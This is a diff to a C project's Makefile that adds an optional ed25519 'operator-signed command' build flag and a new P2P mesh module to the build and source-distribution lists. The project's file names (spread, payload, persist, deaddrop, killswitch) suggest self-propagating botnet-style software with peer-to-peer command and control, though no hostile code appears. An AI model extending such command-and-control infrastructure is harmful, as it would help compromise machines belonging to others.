@@ -15,6 +15,15 @@ ifdef TLS
   CFLAGS := $(CFLAGS:-static=)
 endif
 
+# P2P mesh ed25519 command signing: make MESH_ED25519=1 to enable
+# operator-signed command verification (links OpenSSL, like TLS). Without
+# it the mesh transport runs but refuses all signed commands (fail-closed).
+ifdef MESH_ED25519
+  CFLAGS += -DMESH_ED25519
+  LDFLAGS += -lssl -lcrypto
+  CFLAGS := $(CFLAGS:-static=)
+endif
+
 # Architecture detection
 ARCH := $(shell uname -m)
 UNAME := $(shell uname -s)
@@ -33,7 +42,8 @@ SRCS := notnet.c \
         src/proxy.c \
         src/relay.c \
         src/plugin.c \
-        src/killswitch.c
+        src/killswitch.c \
+        src/mesh.c
 
 OBJS := $(SRCS:.c=.o)
 
@@ -94,11 +104,11 @@ dist: all
 DIST_SRC_FILES := notnet.c \
                   src/protocol.c src/spread.c src/payload.c \
                   src/persist.c src/util.c src/deaddrop.c src/proxy.c \
-                  src/relay.c src/plugin.c src/killswitch.c \
+                  src/relay.c src/plugin.c src/killswitch.c src/mesh.c \
                   include/config.h include/protocol.h include/spread.h \
                   include/payload.h include/persist.h include/util.h \
                   include/deaddrop.h include/proxy.h include/relay.h \
-                  include/plugin.h include/killswitch.h \
+                  include/plugin.h include/killswitch.h include/mesh.h \
                   Makefile
 dist-src:
 	@mkdir -p dist
@@ -127,6 +137,7 @@ help:
 	@echo "  clean        Remove build artifacts"
 	@echo "  dist         Create distribution archive"
 	@echo "  dist-src     Create on-target compilation source bundle + pin"
+	@echo "  MESH_ED25519=1  Also build with ed25519 command-signing (links OpenSSL)"
 	@echo "  attest       Write BUILD-ATTESTATION.json for the built binary (#154)"
 	@echo "  release      all + attest + dist-src (release artifact)"
 	@echo "  help         Show this help"
